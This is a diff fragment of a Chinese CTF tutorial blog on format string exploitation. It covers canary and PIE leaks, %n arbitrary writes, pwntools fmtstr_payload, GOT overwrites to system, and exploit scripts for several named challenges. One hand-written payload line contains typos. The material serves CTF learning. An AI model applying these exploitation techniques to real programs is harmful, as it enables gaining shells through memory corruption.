+<p>（2）此时需要编写脚本来实现接收到数据</p>
+<pre><code class="python">r.sendline(&#39;%15$p&#39;)
+canary = int(r.recv(10), 16)
+print(&#39;canary ==&gt;&#39; + hex(canary))
+print type(canary)
+</code></pre>
+<p>canary共有十位，所以需要接收十位。由于接收到的数据类型为str类型，而p32打包的时候需要用到的是整型。所以需要用 int函数将字符转换成整型，后门的16表示转换的进制数，默认十进制</p>
+<p>（3） 溢出时将canary的值重新填写回去，溢出覆盖返回地址即可</p>
+<pre><code class="python">payload = &#39;a&#39; * 32 + p32(canary) + &#39;a&#39;*12 + p32(0x080484df)
+</code></pre>
+<h2 id="2、泄露pie基地址"><a href="#2、泄露pie基地址" class="headerlink" title="2、泄露pie基地址"></a>2、泄露pie基地址</h2><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211730385.png" alt="image-20220430211730385"></p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211756994.png" alt="image-20220430211756994"></p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430211920243.png" alt="image-20220430211920243"></p>
+<h1 id="三、格式化字符串漏洞——任意写"><a href="#三、格式化字符串漏洞——任意写" class="headerlink" title="三、格式化字符串漏洞——任意写"></a>三、格式化字符串漏洞——任意写</h1><h2 id="1、绕过判断，修改某个数值"><a href="#1、绕过判断，修改某个数值" class="headerlink" title="1、绕过判断，修改某个数值"></a>1、绕过判断，修改某个数值</h2><p>%n：把前面已经打印的长度写入某个内存地址，写入的是四个字节</p>
+<p>%hn：写入的是两个字节</p>
+<p>%hhn：写入的是一个字节</p>
+<p>如：</p>
+<blockquote>
+<p>利用 %hhn把值0x6a686664 写道0x8045566地址里面</p>
+</blockquote>
+<p>0x64 写进 0x8045566</p>
+<p>0x66 写进 0x8045567</p>
+<p>0x68 写进 0x8045568</p>
+<p>0x6a 写进 0x8045569</p>
+<p>p32(0x8045566) + p32(0x8045567) + p32(0x8045568) + p32(0x8045569) + ‘%84c%offset$hnn’ + ‘%84c%offset+1$hnn’ + ‘%2c%offset$hnn’  +  ‘%2c%offset+2$hnn’   +  ‘%2c% offset+3+2$hnn’</p>
+<p>如果是逆序的化就需要溢出，取低字节</p>
+<p>（4） %n：将%n之前打印出来的字符个数，赋值给一个变量</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212240038.png" alt="image-20220430212240038"></p>
+<p>很典型的格式化字符串漏洞的任意写题目，只要让pwnme &#x3D;&#x3D; 8就能getshell。</p>
+<p>首先测量格式化输入的地址距离esp的距离：为10</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212852204.png" alt="image-20220430212852204"></p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220430212730081.png" alt="image-20220430212730081"></p>
+<p>接下来就是修改pwnme地址处的值了，先</p>
+<pre><code># payload = fmtstr_payload(10, &#123;0x0804A068: 8&#125;)
+payload = p32(0x0804A068) + &#39;%4c%10$n&#39;
+</code></pre>
+<h2 id="2、任意写神器——fmtstr-payload"><a href="#2、任意写神器——fmtstr-payload" class="headerlink" title="2、任意写神器——fmtstr_payload"></a>2、任意写神器——fmtstr_payload</h2><p>fmtstr_payload是pwntools里面的一个工具</p>
+<pre><code class="python">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)
+# 第一个参数表示格式化字符串的偏移
+# 第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system地址，就写成&#123;printf: system&#125;
+# 第三个参数表示已经输出的字符个数，这里没有为，采用默认0
+# 第四个参数表示写入方式，是按照字节(byte)、双字节(short)、还是四字节(int)。他对应着hhn、hn、n。默认为hhn
+#fmtstr_payload函数返回的就是payload
+
+一般做题主要就是前面的两个参数，基本格式为：
+fmtstr_payload(offset, &#123;address:vaule1&#125;) 	==&gt; 	payload = fmtstr_payload(10, &#123;atoi_addr: system_addr&#125;)
+</code></pre>
+<p>所以直接利用fmtstr_payload函数修改任意地址的值为任意值即可getshell</p>
+<p>如果整个程序都没有开启relor保护的化，可以直接下面存在的一个函数的got表指向system函数的地址，使其执行该函数时会自动执行system函数的地址</p>
+<pre><code class="python">payload = fmtstr_payload(10, &#123;e.got[&quot;puts&quot;]: 0x080486E8&#125;)
+</code></pre>
+<h1 id="四、格式化字符串漏洞——无限循环"><a href="#四、格式化字符串漏洞——无限循环" class="headerlink" title="四、格式化字符串漏洞——无限循环"></a>四、格式化字符串漏洞——无限循环</h1><p>待补充</p>
+<h1 id="五、常见格式化字符串漏洞题目"><a href="#五、常见格式化字符串漏洞题目" class="headerlink" title="五、常见格式化字符串漏洞题目"></a>五、常见格式化字符串漏洞题目</h1><h2 id="1、第五空间2019-决赛-PWN5"><a href="#1、第五空间2019-决赛-PWN5" class="headerlink" title="1、第五空间2019_决赛_PWN5"></a>1、第五空间2019_决赛_PWN5</h2><p>利用格式化字符串漏洞的任意写功能，将随机数的值修改成一个固定的值</p>
 <p>（1）程序分析：32为程序，开启了Canary和NX保护</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220322215436958.png"></p>
+<p><img src="/img/image-20220322215436958-16593323952891.png"></p>
 <p>（2）打开IDA查看一下源代码</p>
 <p>存在一个格式化字符串漏洞，存在一个判断，当输入的一个数与一个随机数相等时获取flag</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220322215947385.png" alt="image-20220322215947385"></p>
-<p>（3）程序分析</p>
-<p>① time 与 srand函数设置一个随机数，这里没什么用</p>
-<p>② 打开一个文件然后从里面读取4个字节大小的内容，没有这个文件，读取的数是随机的</p>
-<p>③ 然后输入你的姓名，不存在溢出情况，但是有一个格式化字符串漏洞</p>
-<p>④然后再输入你的密码，这个密码值会与之前在文件里面的数值进行比较，如果相同就获取flag</p>
+<p><img src="/img/image-20220322215947385-16593323952893.png" alt="image-20220322215947385"></p>
+<p>（3）整体分析</p>
+<ul>
+<li>time 与 srand函数设置一个随机数，这里没什么用</li>
+<li>打开一个文件然后从里面读取4个字节大小的内容，没有这个文件，读取的数是随机的</li>
+<li>然后输入你的姓名，不存在溢出情况，但是有一个格式化字符串漏洞</li>
+<li>然后再输入你的密码，这个密码值会与之前在文件里面的数值进行比较，如果相同就获取flag</li>
+</ul>
 <p>（4）漏洞分析</p>
-<p>① 存在格式化字符串漏洞，利用它任意写的特点。第一次输入这个随机数改成一个常数，第二次输入这个常数就能判断成功获得flag了。</p>
-<p>② 由于这个程序没有开启RELRO保护，可以修改plt表和got表。可以利用格式化字符串的任意写功能，第一次输入时将atoi函数的got表修改成system函数，第二次输入时将nptr处写出 “&#x2F;bin&#x2F;sh”，因此当你接下来要执行atoi函数时就会执行system函数，就可以获取flag</p>
+<ul>
+<li>存在格式化字符串漏洞，利用它任意写的特点。第一次输入这个随机数改成一个常数，第二次输入这个常数就能判断成功获得flag了。</li>
+<li>由于这个程序没有开启RELRO保护，可以修改plt表和got表。可以利用格式化字符串的任意写功能，第一次输入时将atoi函数的got表修改成system函数，第二次输入时将nptr处写出 “&#x2F;bin&#x2F;sh”，因此当你接下来要执行atoi函数时就会执行system函数，就可以获取flag</li>
+</ul>
 <p>（5）解题过程</p>
-<p>① 确定格式化字符串的位置， 可以发现格式化字符串在第十个</p>
+<ul>
+<li>确定格式化字符串的位置， 可以发现格式化字符串在第十个</li>
+</ul>
 <pre><code class="bash">muggle@muggle-virtual-machine:~/CTF-Pwn/BUUCTF/[第五空间2019 决赛]PWN5$ ./pwn
 your name:aaaa -%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
 Hello,aaaa -0xff947738-0x63-(nil)-0xf7f0da9c-0x3-0xf7ee0410-0x1-(nil)-0x1-0x61616161-0x70252d20-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70
 </code></pre>
-<p>② 然后将随机数修改为4</p>
+<ul>
+<li>然后将随机数修改为4</li>
+</ul>
 <p>exp1 ：</p>
 <pre><code class="python">from pwn import *
 
@@ -802,8 +899,9 @@ r.interactive()
 <blockquote>
 <p>利用fmstr_payload这个工具，直接将atoi的got表的地址改成了system函数地址，然后再输入参数就可以在执行atoi时执行system函数地址。</p>
 </blockquote>
-<h1 id="jarvisoj-fm——任意写"><a href="#jarvisoj-fm——任意写" class="headerlink" title="jarvisoj_fm——任意写"></a>jarvisoj_fm——任意写</h1><p>程序分析：**<font color=red >32位程序，开启了NX保护</font>**，打开 IDA， 查看一下源代码</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220720165419041.png" alt="image-20220720165419041"></p>
+<h2 id="2、jarvisoj-fm"><a href="#2、jarvisoj-fm" class="headerlink" title="2、jarvisoj_fm"></a>2、jarvisoj_fm</h2><p>任意写</p>
+<p>（1）程序分析：32位程序，开启了NX保护，打开 IDA， 查看一下源代码</p>
+<p><img src="/img/image-20220720165419041-16593323952895.png" alt="image-20220720165419041"></p>
 <p>可以明显的看到格式化字符串漏洞，并且当x等于4时就可以获得权限。所以这道题的思路就是利用格式化字符串漏洞的任意写功能修改x的值为4。</p>
 <p>exp：</p>
 <pre><code class="python">from pwn import *
@@ -824,7 +922,8 @@ r.sendline(payload1)
 r.sendline(&quot;cat ./flag&quot;)
 r.interactive()
 </code></pre>
-<h1 id="HarekazeCTF-2019——ret2libc（printf泄露）"><a href="#HarekazeCTF-2019——ret2libc（printf泄露）" class="headerlink" title="HarekazeCTF_2019——ret2libc（printf泄露）"></a>HarekazeCTF_2019——ret2libc（printf泄露）</h1><p>程序分析：**<font color=red >64位程序，开启了NX保护</font>**，打开 IDA， 查看一下源代码<br><img src="/./img/image-20220720165444148.png" alt="image-20220720165444148"><br>存在read函数溢出，再查看是否存在后门地址。没有发现system函数，利用libc泄露system函数了</p>
+<h2 id="3、HarekazeCTF-2019"><a href="#3、HarekazeCTF-2019" class="headerlink" title="3、HarekazeCTF_2019"></a>3、HarekazeCTF_2019</h2><p>ret2libc（printf泄露）</p>
+<p>程序分析：**<font color=red >64位程序，开启了NX保护</font>**，打开 IDA， 查看一下源代码<br><img src="/./img/image-20220720165444148.png" alt="image-20220720165444148"><br>存在read函数溢出，再查看是否存在后门地址。没有发现system函数，利用libc泄露system函数了</p>
 <p>注意：</p>
 <p>（1）这里是用printf来打印泄露read函数的真正地址，这里泄露printf函数是不行的。printf泄露的话要注意第一个是格式化字符串，所以你首先须要在ida里面找到一个带有%s格式化字符串的地址。<br>（2）找某个文件名的方法</p>
 <blockquote>
@@ -868,6 +967,10 @@ r.sendline(payload2)
 r.interactive()
 
 </code></pre>
+<h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><p>（1）<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39268483/article/details/92399248">https://blog.csdn.net/qq_39268483/article/details/92399248</a></p>
+<p>（2）<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-57-857.htm">https://www.kanxue.com/book-57-857.htm</a></p>
+<p>（3）<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/</a></p>
+<p>（4）<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1669093381463931480&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1669093381463931480&amp;wfr=spider&amp;for=pc</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
